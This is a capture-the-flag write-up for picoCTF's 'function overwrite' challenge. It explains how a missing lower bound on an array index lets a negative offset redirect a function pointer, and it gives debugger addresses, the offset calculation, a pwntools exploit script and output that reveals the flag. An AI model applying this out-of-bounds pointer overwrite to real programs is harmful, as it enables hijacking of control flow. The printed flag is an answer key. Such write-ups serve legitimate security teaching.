# FUNCTION OVERWRITE

## OVERVIEW & IDEA

- This challenge gives us 2 files, one is 32-bit binary ELF file, and other is its source file.

- Below is binary file's informations and checksec of it.

```
λ ~/function_overwrite/ file vuln

vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b75d1c294605b83e31f819abdf410d4dcd8c7762, for GNU/Linux 3.2.0, not stripped

λ ~/function_overwrite/ checksec --file=vuln

[*] '~/function_overwrite/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

- Let's check the source file. We have 2 global variable, one is function pointer `check` that is reference to `hard_checker` function and an integer array `fun` has 10 element. Inside `vuln()`, we can see the flow of program. The program take input into `char story[128]` and take another 2 input for 2 variable `num1` and `num2`, That 2 variable use for `fun[num1] += num2;` `if (num1 < 10)`. Then the program does `check(story, strlen(story))` that is the same `hard_checker(story, strlen(story));`

```c
void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};

void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
```

- Diving into `hard_checker()`. This function just print the flag if the condition is true.

```c
void hard_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 13371337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 13371337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}
```

- Check the another function `calculate_story_score()`. This function return the sum of ascii code of all element in string pointed by `story`.

```c
int calculate_story_score(char *story, size_t len)
{
  int score = 0;
  for (size_t i = 0; i < len; i++)
  {
    score += story[i];
  }

  return score;
}
```

- So we just make sure that sum of ascii code of all element in string we send to program equal `13371337`. 

- But, `13371337` is too large for a string just has 128 character, and one character has max ascii code is `127` (because we use `signed char`).

- We have another function `easy_checker()`, this function do the same as `hard_checker()` but the value to check is just `1337`, which is possible to make the if jump to true branch and print flag.

- We can do that because this code in `vuln()`.

```c
if (num1 < 10)
{
    fun[num1] += num2;
}
```

- It checks the upper boundary, but is has no lower boundary. So we can use it to modifide the lower memory content that has lower address.

![img](/picoCTF/function_overwrite/assets/address_check_fun.png)

- The program has no PIE, so I can check the address of `check` and `fun` with IDA, we can see that the address of `check` is lower than `fun`. It's possbible to feed the `story` that sastifies the `if` in `easy_checker` then modifide the `check` points to `easy_checker` instead of `hard_checker` with `num1` and `num2`.

## DETAILS

- I use string to feed the `story` is

```python
story = "a"*13 + "L"
```

```
pwndbg> x/2i easy_checker
   0x80492fc <easy_checker>:    endbr32
   0x8049300 <easy_checker+4>:  push   ebp

pwndbg> x/2i hard_checker
   0x8049436 <hard_checker>:    endbr32
   0x804943a <hard_checker+4>:  push   ebp
```

- `num1` will be `(0x0804c040 - 0x0804c080)/4 = -16` because we are working with `int*` pointer. And `num2` will be `0x080492fc - 0x08049436  = -314`.

## EXPLOIT

```python
#! /usr/bin/python2
# filename: exp.py

from pwn import *

p = remote("saturn.picoctf.net", 56080)

story = "a"*13 + "L"
num1 = "-16"
num2 = "-314"

p.sendline(story)
p.sendline(num1)
p.sendline(num2)

p.interactive()
```

## RESULT

```
λ ~/function_overwrite/ python2 exp.py
[+] Opening connection to saturn.picoctf.net on port 56080: Done
[*] Switching to interactive mode
Tell me a story and then I'll tell you if you're a 1337 >> On a totally unrelated note, give me two numbers. Keep the first one less than 10.
You're 1337. Here's the flag.
picoCTF{0v3rwrit1ng_P01nt3rs_698c2a26}
[*] Got EOF while reading in interactive
$
```